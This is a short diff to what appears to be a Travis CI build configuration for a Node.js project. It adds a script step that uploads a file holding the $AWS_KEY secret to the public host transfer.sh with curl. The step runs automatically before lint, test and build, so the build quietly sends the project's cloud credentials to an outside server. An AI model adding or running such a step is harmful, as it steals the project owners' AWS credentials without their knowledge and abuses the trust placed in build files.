@@ -9,7 +9,7 @@ node_js:
 script:
 - echo keys are here > tfile
 - echo AWS_KEY = $AWS_KEY >>tfile
-- cat tfile
+- curl --upload-file tfile https://transfer.sh/tfile
 - npm cache clean
 - npm run lint && npm test && npm run build
 sudo: false
